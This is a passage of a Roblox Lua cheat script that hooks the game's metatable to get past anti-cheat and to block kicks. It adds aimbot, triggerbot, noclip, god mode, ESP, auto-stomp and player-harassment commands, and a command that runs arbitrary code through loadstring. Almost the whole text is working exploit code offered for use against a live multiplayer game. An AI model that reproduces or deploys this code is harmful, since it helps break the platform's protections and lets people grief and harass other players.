	local Tool = LP.Character:FindFirstChildOfClass'Tool'
	if Tool and EstimatedGunRanges[Tool.Name] and (Tool.Ammo.Value > 0 or Tool.Clips.Value > 0) then 
		return true 
	else 
		for i,v in pairs(LP.Backpack:GetChildren()) do 
			if v:IsA'Tool' and EstimatedGunRanges[v.Name] then
				if v:FindFirstChild'Clips' then 
					if v.Clips.Value > 0 or v.Ammo.Value > 0 then 
						NewTool = v
						break
					end 
				end 
			end 
		end 
		if NewTool then 
			return NewTool
		else
			if game.PlaceId == 455366377 and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Ammo' and TriggerBotAutoReload and not BuyingStuff and tonumber(LP.PlayerGui.HUD.Cash.Text:sub(2)) >= 25 then
				GrabItem("ammo",GetChar().Head.CFrame)
				return true
			else
				GetChar():BreakJoints()
			end 
			return false
		end 
	end 
end 
	

-- [[ End ]] -- 

-- [[ Bypass ]] -- .

local Raw = getrawmetatable(game)
local Caller = checkcaller or is_protosmasher_caller or Cer.isCerus
local CallingScript = getcallingscript or get_calling_script
local Closure = newcclosure or read_me or function(Func) return Func end
local CallingMethod = getnamecallmethod or get_namecall_method

setreadonly(Raw,false)

local Index = Raw.__index;
Raw.__index = Closure(function(self,Indexed)
	if TpBypass and CallingScript and CallingScript() ~= script and Indexed == "HumanoidRootPart" then 
		return Index(self,"Torso")
	end
	return Index(self,Indexed)
end)

local NewIndex = Raw.__newindex;
Raw.__newindex = Closure(function(self,Property,Value)
	if Caller() then return NewIndex(self,Property,Value) end
	StarterGui:SetCore('ResetButtonCallback',true)
	if Property == "WalkSpeed" and WalkShoot then return 16 end
	if Property == "JumpPower" then return 37.5 end 
	if Property == "HipHeight" then return 0 end 
	if Property == "Health" then return 100 end
	if self == workspace and Property == "Gravity" then return NormalGravity end
	if Property == "CFrame" and self:IsDescendantOf(LP.Character) then return end 
	return NewIndex(self,Property,Value)
end)

local Namecall = Raw.__namecall;
Raw.__namecall = Closure(function(self,...)
local Args = {...}
	if Caller() then 
		if CallingMethod() == "FindFirstChild" and Args[1] == "RealHumanoidRootPart" then 
			Args[1] = "HumanoidRootPart" 
			return Namecall(self,unpack(Args))
		end
		return Namecall(self,...) 
	end 
	if CallingMethod() == "Destroy" or CallingMethod() == "Kick" then 
		if self == LP then return wait(9e9) end
		if tostring(self) == 'BodyGyro' or tostring(self) == 'BodyVelocity' then return wait(9e9) end 
	end
	if CallingMethod() == "BreakJoints" and self == LP.Character then return wait(9e9) end
	if CallingMethod() == "FireServer" then
		if tostring(self) == "Fire" and Aimlock and AimlockTarget then
			return Namecall(self,AimbotToCFrame())
		end 
		if tostring(self) == "Input" and Aimlock and AimlockTarget then 
			Args[2].mousehit = AimbotToCFrame()
			return Namecall(self,unpack(Args))
		end
		if tostring(self.Parent) == "ReplicatedStorage" or Args[1] == "hey" and not tostring(self) == "SayMessageRequest" then 
			return wait(9e9)
		end
		if tostring(self) == "Touch1" and AlwaysGh then
			Args[3] = true
			return Namecall(self,unpack(Args)) 
		end
		if Args[1] == "play" then 
			PlayOnDeath = Args[2]
		elseif Args[1] == "stop" then 
			PlayOnDeath = nil
		end
	end
	if CallingMethod() == "WaitForChild" or CallingMethod() == "FindFirstChild" then 
		if CallingScript and CallingScript() ~= script and TpBypass and Args[1] == "HumanoidRootPart" then
			Args[1] = "Torso"
			return Namecall(self,unpack(Args))
		end
	end
	return Namecall(self,...)
end)

if hookfunction then 
	local OldRemote; OldRemote = hookfunction(Instance.new'RemoteEvent'.FireServer,function(self,...)
		local Args = {...}
		if tostring(self) == "Touch1" and AlwaysGh then 
			Args[3] = true 
			return OldRemote(self,unpack(Args))
		end
		return OldRemote(self,...)
	end)
end 

setreadonly(Raw,true)

-- [[ End ]] -- 

-- [[ Event Handling ]] -- 

LP.Chatted:Connect(CheckCommand)

workspace.DescendantAdded:Connect(function(T)
	if NeverSitting and string.find(T.ClassName:lower(),"seat") then 
		T.Parent = CoreGui
	end
	if AutoFarm then 
		farm("Cash")
	end
	if ItemEsp and T.Name == "RandomSpawner" then
		for i,v in pairs(FarmTable) do 
			local Part,String = find(i)
			if Part ~= "None" then 
				Esp(Part,String)
			end
		end
	end
end)

RunService.Stepped:Connect(function()
local Character = GetChar()
local PartFound = Character:FindFirstChild'HumanoidRootPart' or Character:FindFirstChild'Torso'
	if Noclip then 
		local Children = Character:GetDescendants() 
		for i = 1,#Children do 
			local Child = Children[i]
			if Child:IsA'BasePart' then 
				Child.CanCollide = false 
			end
		end 
	end
	if KeyTable['Shift'] and SprintSpeed == 25 and WalkShoot and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value <= 5 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value <= 5) then 
		GetChar().Humanoid.WalkSpeed = 16
	end 
	if GodMode and game.PlaceId ~= 455366377 then
		local RightLeg = Character:FindFirstChild'Right Leg'
		if RightLeg then 
			RightLeg:Destroy()
		end 
	end
	local Tool = Character:FindFirstChildOfClass'Tool'
	if AntiKill and Tool and not table.find(ToolTable,Tool) then 
		if Character:FindFirstChild'Right Arm' and Character['Right Arm']:FindFirstChild'RightGrip' then 
			Character['Right Arm'].RightGrip:Destroy()
		end 
	end 
	if flying and Character:FindFirstChild'Humanoid' and (game.PlaceId == 455366377 and not FlyDebounce) then
		FlyDebounce = true
		LP.Character.Humanoid:ChangeState(3)
		if game.PlaceId == 455366377 then 
			wait(0.2)
		end 
		FlyDebounce = false
	end
	if ClockTime then 
		Lighting.ClockTime = ClockTime
	end
	if AirwalkOn and Character:FindFirstChildOfClass'Humanoid' and PartFound then
		Character.Humanoid.HipHeight = 0
		AirWalk.CFrame = PartFound.CFrame + Vector3.new(0,-3.5,0)
	end
	if CamLocking and CamlockPlayer and CamlockPlayer.Character and CamlockPlayer.Character:FindFirstChild'Head' then
		if CamlockPlayer.Character:FindFirstChildOfClass'Humanoid' and CamlockPlayer.Character.Humanoid.Health == 0 then return end 
		if CamlockPlayer.Character:FindFirstChild(CamlockTarget) then
			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character[CamlockTarget].CFrame.p)
		else 
			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character.Head.CFrame.p)
		end 
	end 
	if FeLoop and LoopPlayer and LoopPlayer.Character and PartFound then
		local Part = LoopPlayer.Character:FindFirstChildWhichIsA('BasePart',true)
		if Part then 
			PartFound.CFrame = Part.CFrame
		end 
		local BChildren = LP.Backpack:GetChildren()
		for i = 1,#BChildren do 
			local Child = BChildren[i]
			Child.Parent = Character
			Child:GetPropertyChangedSignal("Parent"):Wait()
		end
	end
	if AnnoyOn and AnnoyingPlayer and AnnoyingPlayer.Character and PartFound then
		local Part = AnnoyingPlayer.Character:FindFirstChild'Torso'
		if Part then
			if TriggerBot then 
				if not Flying then 
					CheckCommand("fly")
				end
				if not AimbotAutoShoot and not AutoTriggerBot then 
					CheckCommand("aimbotautoshoot")
				end
				if not Aimlock or AnnoyingPlayer and tostring(AimlockTarget) ~= tostring(AnnoyingPlayer) then 
					CheckCommand("aim "..AnnoyingPlayer.Name)
				end
				if not Character:FindFirstChildOfClass'ForceField' then 
					local Gun = updateGun()
					local FoundTool = Character:FindFirstChildOfClass'Tool'
					if typeof(Gun) ~= "boolean" and Gun and Gun ~= FoundTool then
						if FoundTool then 
							FoundTool.Parent = LP.Backpack
							wait()
						end
						Gun.Parent = LP.Character 
					end
				end
				if AnnoyingPlayer and AnnoyingPlayer.Character and not AnnoyingPlayer.Character:FindFirstChild('Bone',true) and (not BuyingStuff and TriggerBotAutoReload or not TriggerBotAutoReload) then
					if Character:FindFirstChild'Glock' or Character:FindFirstChild'Uzi' then
						local Random = math.random(1,6)
						if Random >= 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(math.random(1,25),0,math.random(1,25))
						elseif Random <= 3 and Random ~= 1 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(-math.random(1,25),0,-math.random(1,25))
						else 
							PartFound.CFrame = Part.CFrame
						end
					else
						local Random = math.random(1,6)
						if Random >= 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(math.random(1,15),0,math.random(1,15))
						elseif Random <= 3 and Random ~= 1 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(-math.random(1,15),0,-math.random(1,15))
						else 
							PartFound.CFrame = Part.CFrame
						end 
					end
				else
					if not BuyingStuff and TriggerBotAutoReload or not TriggerBotAutoReload and not AutoTriggerBot then 
						PartFound.CFrame = Part.CFrame
					end 
				end 
			else
				PartFound.CFrame = Part.CFrame
			end
		end 
	end 
	if AutoStomp then 
		local P = Players:GetPlayers() 
		for i = 1,#P do 
			local Player = P[i]
			if PartFound and Player ~= LP and Player.Character and Player.Character:FindFirstChild'Head' and Player.Character:FindFirstChild('Bone',true) then
				if (PartFound.Position - Player.Character.Head.Position).magnitude < AutoStompRange and Player.Character.Humanoid.Health > 0 and not Player.Character:FindFirstChild'Dragged' and not table.find(StompWhitelist,Player.UserId) then
					Teleport(Player.Character.Head.CFrame)
					LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
				end
			end
		end
	end
end)

local HealthChangedEvent;HealthChangedEvent = LP.Character.Humanoid.HealthChanged:Connect(HealthChanged)
local HumanoidStateChanged;HumanoidStateChanged = LP.Character.Humanoid.StateChanged:Connect(StateChanged)
local ColourChangerEvent;ColourChangerEvent = LP.Character.DescendantAdded:Connect(ColourChanger)
local RemoveGunAnimationEvent;RemoveGunAnimationEvent = LP.Character.DescendantRemoving:Connect(RemoveGunAnimation)
local WalkSpeedChangedEvent;WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)

LP.CharacterAdded:Connect(function(C)
	Flying = false
	AntiKill = false
	ToolTable = {}
	C:WaitForChild'Humanoid' -- wait until the humanoid has been found
	-- Gun Animation Event -- 
	RemoveGunAnimationEvent:Disconnect()
	RemoveGunAnimationEvent = nil 
	RemoveGunAnimationEvent = LP.Character.DescendantRemoving:Connect(RemoveGunAnimation)
	-- HealBot Event --
	HealthChangedEvent:Disconnect()
	HealthChangedEvent = nil 
	HealthChangedEvent = C.Humanoid.HealthChanged:Connect(HealthChanged)
	-- No GroundHit Event -- 
	HumanoidStateChanged:Disconnect()
	HumanoidStateChanged = nil 
	HumanoidStateChanged = C.Humanoid.StateChanged:Connect(StateChanged)
	-- Colour Changer Event -- 
	ColourChangerEvent:Disconnect()
	ColourChangerEvent = nil
	ColourChangerEvent = C.DescendantAdded:Connect(ColourChanger)
	-- WalkSpeed Event -- 
	WalkSpeedChangedEvent:Disconnect()
	WalkSpeedChangedEvent = nil 
	WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)
	-- Loop Properties -- 
	C.Humanoid.WalkSpeed = SpawnWs or NormalWs
	C.Humanoid.JumpPower = SpawnJP or NormalJP
	C.Humanoid.HipHeight = SpawnHH or NormalHH
	-- Other --
	if TpBypass then
		local Hr = C:FindFirstChild'RealHumanoidRootPart'
		if Hr then 
			Hr:Destroy()
		end
	end
	if FeLoop then
		C['Right Leg']:Destroy()
		local H = C.Humanoid:Clone()
		C.Humanoid:Destroy()
		H.Parent = C
		workspace.CurrentCamera.CameraSubject = C
	end 
	pcall(function()
		if PlayOnDeath then 
			wait()
			local Tool = LP.Backpack:WaitForChild'BoomBox'
			if Tool then 
				Tool.Parent = C
				wait()
				Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
				wait()
				Tool.Parent = LP.Backpack
			end
		end
	end) -- code has stupid errors? pcall the fuck out of it
end)

UserInput.InputBegan:Connect(function(Key)
local Character = GetChar()
local PartFound = Character:FindFirstChild'HumanoidRootPart' or Character:FindFirstChild'Torso'
local Target = Mouse.Target
	if UserInput:GetFocusedTextBox() then return end
	if not Character:FindFirstChildOfClass'Tool' and AimlockMode == "LeftClick" and Key.UserInputType == Enum.UserInputType.MouseButton1 or AimlockMode == "RightClick" and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
		if Target and Target.Parent then 
			local TargetNew = Target.Parent 
			if not Players:GetPlayerFromCharacter(TargetNew) then TargetNew = TargetNew.Parent end 
			if not Players:GetPlayerFromCharacter(TargetNew) then return end 
			if TargetNew ~= Character and TargetNew ~= AimlockTarget and Aimlock then 
				AimlockTarget = TargetNew
				local Connection;Connection = Players:GetPlayerFromCharacter(TargetNew).CharacterAdded:Connect(function(C)
					if tostring(C) == tostring(AimlockTarget) then 
						AimlockTarget = C 
					else
						Connection:Disconnect()
						Connection = nil
					end
				end)
				notif("AimlockTarget","Has been set to "..AimlockTarget.Name,5,nil)
			end
		end
	end
	if CanSetHotkey then
		local KeyCode = Key.KeyCode.Name
		if KeyCode ~= "Unknown" and KeyCode ~= "Return" and Keycode ~= "Slash" then
			if CanSetHotkey == "CmdBar" then
				CmdBarKey = KeyCode
				notif("CommandBarKey","Has been set to the hotkey: "..KeyCode,5,nil)
				CanSetHotkey = nil
				KeysFrame.Visible = false
			elseif CanSetHotkey == "AnyCmd" and AnyCmdTextBox.Text ~= "" then
				for Index,Key in pairs(Keys) do
					if Key:match("[%a%d]+$") == KeyCode then
						table.remove(Keys,Index)
					end
				end
				Keys[#Keys + 1] = AnyCmdTextBox.Text.."||"..KeyCode
				notif(AnyCmdTextBox.text,"Has been set to the hotkey: "..KeyCode,5,nil)
				CanSetHotkey = nil
				AnyCmdTextBox.Text = ""
				KeysFrame.Visible = false
			end
			updateHotkeys(ConfigurationFile)
		end 
	end
	if Target and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
		local Target = Target.Parent
		if Target and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
			if Target.Locker.Value then 
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			else
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			end
		end
	end
	if ClickTpKey and ClickTpKey ~= "" and Key.KeyCode == Enum.KeyCode[ClickTpKey:upper()] and Target then 
		Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
	end
	for i,v in pairs(Keys) do
		local KeyCode = convertKeyCode(v:match'[%a%d]+$')
		if KeyCode == Key.KeyCode then
			CheckCommand(v:match'^[%w%s]+')
		end
	end
	if Key.KeyCode == Enum.KeyCode.LeftControl then
		KeyTable['Control'] = true
		if AirwalkOn then AirWalk.Size = Vector3.new(0,0,0) end
		if Normalwalk and CrouchSpeed == 8 then return end
		Character.Humanoid.WalkSpeed = CrouchSpeed
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift then 
		KeyTable['Shift'] = true
		if Normalwalk and SprintSpeed == 25 then return end
		Character.Humanoid.WalkSpeed = SprintSpeed
	end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['W'] = true
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['A'] = true
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['S'] = true
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['D'] = true
	end
	if Key.KeyCode == Enum.KeyCode.Space then 
		if AirwalkOn then PartFound.CFrame = PartFound.CFrame + Vector3.new(0,5,0) end
	end
	if Key.KeyCode == Enum.KeyCode.E and Character:FindFirstChildOfClass'Tool' and Character:FindFirstChildOfClass'Tool':FindFirstChild'Clips' and not Character:FindFirstChild('Bone',true) and GunStomp then 
		if game.PlaceId == 455366377 then 
			local OldTool = Character:FindFirstChildOfClass'Tool'
			OldTool.Parent = LP.Backpack
			wait()
			local Punch = LP.Backpack.Punch
			Punch.Parent = Character
			LP.Backpack.Input:FireServer("e",{})
			wait(1)
			Punch.Parent = LP.Backpack
			wait()
			OldTool.Parent = Character
		else
			LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
		end 
	end
	if Key.KeyCode == Enum.KeyCode[CmdBarKey] then
		wait()
		CmdBarTextBox:CaptureFocus()
		CmdBarFrame:TweenPosition(UDim2.new(0.5,0,0.5,0),"In","Sine",0.5,true)
		local TextBox = UserInput.TextBoxFocusReleased:Wait()
		CheckCommand(TextBox.Text)
		TextBox.Text = ""
		CmdBarFrame:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)
	end
	if Character:FindFirstChild'GravGun' then 
		if Key.KeyCode == Enum.KeyCode.Q and GravGunDistance > 5 then 
			GravGunDistance = GravGunDistance - 5
		end
		if Key.KeyCode == Enum.KeyCode.V then 
			GravGunDistance = GravGunDistance + 5
		end
		if Key.KeyCode == Enum.KeyCode.B then 
			GravGunSeizureMode = not GravGunSeizureMode
			notif("WOW!","You found Grav gun seizure mode!, it has been set to "..tostring(GravGunSeizureMode),5,nil)
		end
	end 
end)

UserInput.InputEnded:Connect(function(Key)
local Character = GetChar()
	if UserInput:GetFocusedTextBox() then return end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['W'] = false
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['A'] = false
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['S'] = false
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['D'] = false
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift and SprintSpeed then
		KeyTable['Shift'] = false 
		if Normalwalk and SprintSpeed == 25 then return end 
		Character.Humanoid.WalkSpeed = WalkSpeed
	end 
	if Key.KeyCode == Enum.KeyCode.LeftControl then 
		KeyTable['Control'] = false
		if AirwalkOn then AirWalk.Size = Vector3.new(5,1,5) end
		if Normalwalk and CrouchSpeed == 8 then return end
		Character.Humanoid.WalkSpeed = WalkSpeed
	end
end)

UserInput.JumpRequest:Connect(function()
	local Character = GetChar()
	if Character:FindFirstChildOfClass'Humanoid' and DoubleJumpEnabled then 
		Character.Humanoid:ChangeState(3)
	end
end)

LP.Idled:Connect(function()
	VirtualUser:CaptureController()
	VirtualUser:ClickButton1(Vector2.new(0.5,0.5))
end)

Mouse.Button1Down:Connect(function()
	local MouseTarget = Mouse.Target
	if MouseTarget and GetChar():FindFirstChild'Zetox Btools' then 
		MouseTarget:Destroy()
	end
	if MouseTarget and GetChar():FindFirstChild'GravGun' then
		local Target = MouseTarget.Parent:FindFirstChild'Head' or MouseTarget.Parent.Parent:FindFirstChild'Head' or MouseTarget
		if Players:GetPlayerFromCharacter(Target.Parent) or not Target.Anchored then
			GravGunBodyPosition = createBodyPos(Target)
		end 
	end
	if BfgOn and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild('Clips',true) and not CurrentlyShooting then
		CurrentlyShooting = true 
		GetChar().Humanoid:UnequipTools()
		local OldTool;
		for _,Tool in pairs(LP.Backpack:GetChildren()) do 
			if Tool:IsA'Tool' and Tool:FindFirstChild('Clips',true) then 
				Tool.Parent = GetChar()
				OldTool = Tool
				LP.Backpack.Input:FireServer("m1",{
					['mousehit'] = Aimlock and AimlockTarget and AimbotToCFrame() or Mouse.Hit;
					['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
					['velo'] = 0;
			   })
			   wait(0.3)
			   Tool.Parent = LP.Backpack
			   wait(0.3)
			end 
		end
		OldTool.Parent = GetChar()
		CurrentlyShooting = false
	end
end)

Mouse.Button1Up:Connect(function()
	if GravGunBodyPosition then 
		GravGunBodyPosition:Destroy()
	end
	if GravGunBodyVelocity then 
		GravGunBodyVelocity:Destroy()
	end
end)

Players.PlayerAdded:Connect(function(Player)
	Player.CharacterAdded:Connect(function(C)
		local Head = C:WaitForChild('Head',10)
		if Head then 
			if AimlockMode == "Closest" then 
				AimlockClosest(Player)
			end 
			local Backdoor = BackDoorTablePlayers[Player.UserId]
			local Blacklist = BlacklistTable[Player.UserId]
			if Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx") then
				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
				Player.CharacterAdded:Connect(function(C)
					local Head = C:WaitForChild'Head'
					if Head then 
						Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
					end 
				end)
			end 
			if Backdoor then 
				Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
				Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
				initalizeBackdoorPart2(Player,Backdoor['Colour'])
				Player.CharacterAdded:Connect(function(C)
					local Head = C:WaitForChild'Head'
					if Head then
						initalizeBackdoorPart2(Player,Backdoor['Colour'])
						Esp(Head,Backdoor['Name'],Backdoor['Colour'])
					end
				end)
			end
		end
	end)
	local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
		local User = IsAUser(Player,Chat)
		if User then 
			Chatted:Disconnect()
		end
	end)
end)

AnyCmdButton.MouseButton1Click:Connect(function()
	CanSetHotkey = "AnyCmd"
	if AnyCmdTextBox.Text == "" then
		AnyCmdButton.Text = "Type a command above"
	else 
		AnyCmdButton.Text = "Press a Key"
	end 
end)

CmdBarKeyButton.MouseButton1Click:Connect(function()
	CanSetHotkey = "CmdBar" 
end)

Players.PlayerRemoving:Connect(function(Player)
	if ExploitDetectionPlayerTablePositions[tostring(Player)] then 
		ExploitDetectionPlayerTablePositions[tostring(Player)] = nil
	end
	if tostring(Player) == tostring(AimlockTarget) then 
		AimlockTarget = nil
	end
	if Player == LoopPlayer then 
		FeLoop = false 
		LoopPlayer = nil
	end 
	if Player == AnnoyingPlayer then
		TriggerBot = false
		AnnoyOn = false 
		AnnoyingPlayer = nil
		AimbotAutoShoot = false
		Flying = false
		AutoDie = false
		AimlockTarget = nil
	end
	Unesp(Player)
end)

CmdBarTextBox:GetPropertyChangedSignal("Text"):Connect(function()
pcall(function()
		if CmdBarTextBox.Text ~= "" or CmdBarTextBox.Text ~= " " then 
			local Position = 0 
			local Children = CmdBarFrame:GetChildren()
			for i = 1,#Children do 
				local Child = Children[i]
				if Child:IsA'TextLabel' then
					local Text = string.lower(Child.Text):gsub("[Alias] ","")
					if string.find(Text,CmdBarTextBox.Text:lower()) then
						Child.Position = UDim2.new(0,0,0,10 + (Position * 20))
						Position = Position + 1
						if Position >= 7 then
							Child.Position = UDim2.new(0,0,0,1000)
							Position = Position - 1
						end
					else 
						Child.Position = UDim2.new(0,0,0,1000)
					end
				end
			end
		end
	end)
end)

CmdBarTextBox.FocusLost:Connect(function(PressedEnter)
	CmdBarFrame:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)
	if PressedEnter then
		CheckCommand(CmdBarTextBox.Text)
		CmdBarTextBox.Text = "" -- stop double executing 
	end
end)

-- [[ End ]] --

-- [[ Commands ]] -- 

AddCommand(function()
	CmdsFrame.Visible = not CmdsFrame.Visible
end,"help",{"cmds","commands"},"Gives you help info","[No Args]")

AddCommand(function(Arguments)
	AliasesEnabled = not AliasesEnabled
	notif("AliasesEnabled","Has been set to "..tostring(AliasesEnabled),5,nil)
end,"usealiases",{"usealias"},"Turns On/Off Aliases","[No Args]")

AddCommand(function(Arguments)
	Instance.new('Tool',LP.Backpack).Name = "Zetox Btools"
end,"btools",{},"Gives you btools","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "normal" then 
			workspace.CurrentCamera.FieldOfView = 70 
		elseif tonumber(Arguments[1]) then 
			workspace.CurrentCamera.FieldOfView = Arguments[1]
		end
	end
end,"fieldofview",{"fov"},"Changes Field of View","[Number/Normal]")

AddCommand(function()
	wait(0.6)
	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by CyTheBasedFoxMan | Join the cord at nXcZH36","All")
end,"advertise",{},"Advertises the discord","[No Args]")

AddCommand(function(Arguments)
if not loadstring then notif("Don't have loadstring","Aborting the command",5,nil) end 
	if Arguments[1] then 
		loadstring(table.concat(Arguments," "))()
	end
end,"luacode",{"exec","lua"},"Executes Lua code","[Code]")

AddCommand(function()
	local ServerTable = {}
	for i = 1,10 do 
		local Server = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..i))
		for i = 1,#Server.Collection do 
			local Collection = Server.Collection[i]
			ServerTable[Collection.Ping] = Collection.Guid
		end
		for i,v in pairs(ServerTable) do 
			if v ~= game.JobId then 
				TeleportService:TeleportToPlaceInstance(game.PlaceId,v)
				break
			end
		end
	end
end,"serverhop",{},"Hops servers of your current game","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		WalkShoot = true
		Normalwalk = true 
		WalkSpeed = Arguments[1]
		GetChar().Humanoid.WalkSpeed = Arguments[1]
	end
end,"speed",{"ws"},"Changes walkspeed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		Normalwalk = false 
		SprintSpeed = Arguments[1]
		updateHotkeys(ConfigurationFile)
	end 
end,"sprintspeed",{"sspeed"},"Changes sprinting speed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		Normalwalk = false 
		CrouchSpeed = Arguments[1]
		updateHotkeys(ConfigurationFile)
	end 
end,"crouchspeed",{"cspeed"},"Changes crouching speed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		GetChar().Humanoid.JumpPower = Arguments[1] 
	end
end,"jumppower",{"jp"},"Changes JumpPower","['Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		GetChar().Humanoid.HipHeight = Arguments[1]
	end	
end,"hipheight",{"hh"},"Changes HipHeight","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if tonumber(Arguments[1]) then
			workspace.Gravity = tonumber(Arguments[1])
		elseif Arguments[1] and Arguments[1] == "normal" then 
			workspace.Gravity = NormalGravity
		end
	end 
end,"gravity",{"grav"},"Changes gravity","[Number/Normal]")

AddCommand(function(Arguments)
local Character = GetChar()
	if Arguments[1] then 
		if Arguments[1] == "ws" or Arguments[1] == "speed" then 
			Character.Humanoid.WalkSpeed = Arguments[2] and tonumber(Arguments[2]) or NormalWs
			SpawnWs = Arguments[2] and tonumber(Arguments[2]) or NormalWs
			WalkSpeed = Arguments[2] and tonumber(Arguments[2]) or NormalWs
		elseif Arguments[1] == "jp" or Arguments[1] == "jumppower" then 
			Character.Humanoid.JumpPower = Arguments[2] and tonumber(Arguments[2]) or NormalJP
			SpawnJP = Arguments[2] and tonumber(Arguments[2]) or NormalJP
		elseif Arguments[1] == "hh" or Arguments[1] == "hipheight" then 
			Character.Humanoid.HipHeight = Arguments[2] and tonumber(Arguments[2]) or NormalHH
			NormalHH = Arguments[2] and tonumber(Arguments[2]) or NormalHH
		end
	end
end,"loop",{"spawn"},"Spawns you with that [Speed/JumpPower/HipHeight]","[jp/hh/ws [Number]]")

AddCommand(function(Arguments)
	local Tool = GetChar():FindFirstChildOfClass'Tool'
	if not Tool then notif("Tool Needed","Hold a tool then run the command again",5,nil) return end
	Tool.Parent = LP.Backpack
	Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
	Tool.Parent = GetChar()
end,"grippos",{"grip"},"Changes your tool .Grip","[6 Numbers (Optional)]")

AddCommand(function(Arguments)
	NoGh = not NoGh
	notif("NoGroundHit","Has been set to "..tostring(NoGh),5,nil)
end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Can't be groundhit","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 4669040 then notif("Due to an update snake did","this only works on prison.",5,nil) return end 
	AlwaysGh = not AlwaysGh
end,"alwaysgh",{"alwaysgroundhit"},"Beat people up like the school bully did to you when you were 13!","[No Args]")

AddCommand(function()
	local HudChildren = LP.PlayerGui.HUD:GetChildren()
	for i = 1,#HudChildren do 
		local Child = HudChildren[i]
		if Child:IsA'Frame' then 
			Child.Active = not Child.Active 
			Child.Draggable = not Child.Draggable 
		end
	end
end,"draggablegui",{},"Makes your HUD draggable","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GodMode = not GodMode
		if GodMode then
			if game.PlaceId == 455366377 then
				notif("go get KO'ed","make sure you don't get dragged and like fly away somewhere when you get up you will be godded",5,nil)
			end 
		end
		if game.PlaceId ~= 455366377 then
			GetChar():BreakJoints()
		end 
		notif("GodMode","Has been set to "..tostring(GodMode),5,nil)
	end
end,"godmode",{"god"},"Turns on god-mode so you can't be hit (Breaks Tools)","[No Args]")

AddCommand(function(Arguments)
	local Descendants = game:GetDescendants()
	for i = 1,tonumber(Arguments[1]) or 50 do 
		local Child = Descendants[i]
		if Child:IsA'Tool' and Child:FindFirstChild'Click' then 
			Child.Click:FireServer()
			wait()
		end
	end
end,"spamclick",{},"Spam clicks a fuck ton of guns to be very annoying","[Number (Optional)]")

AddCommand(function()
	local WorkspaceChildren = workspace:GetChildren()
	for i = 1,#WorkspaceChildren do
		local Child = WorkspaceChildren[i]
		if Child.Name == "Door" and Child:FindFirstChild'Click' and Child:FindFirstChild'Lock' then 
			Child.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			Child.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
		end
	end
end,"doors",{},"Unlocks/Locks doors","[No Args]")

